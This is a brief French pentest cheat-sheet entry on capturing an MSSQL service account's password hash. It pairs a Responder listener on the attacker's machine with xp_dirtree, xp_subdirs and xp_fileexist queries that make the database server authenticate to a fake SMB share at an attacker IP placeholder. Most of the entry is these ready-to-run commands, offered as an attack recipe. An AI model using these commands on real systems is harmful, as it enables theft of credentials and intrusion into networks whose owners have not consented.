Une fois connecté sur un serveur MSSQL il peut être possible d'accéder à un partage SMB via la commande xp_dirtree / xp_subdir / xp_fileexist, ce qui peut possiblement permettre de récupérer le hash de l'utilisateur:

Sur le poste attaquant:

```bash
sudo responder -I tun0
```

Sur MSSQL:

```sql
xp_dirtree '\\$ip$\fauxpartage'
exec master.dbo.xp_dirtree '\\$ip$\fauxpartage'
EXEC master..xp_subdirs '\\$ip$\fauxpartage'
EXEC master..xp_fileexist '\\$ip$\fauxpartage'
```
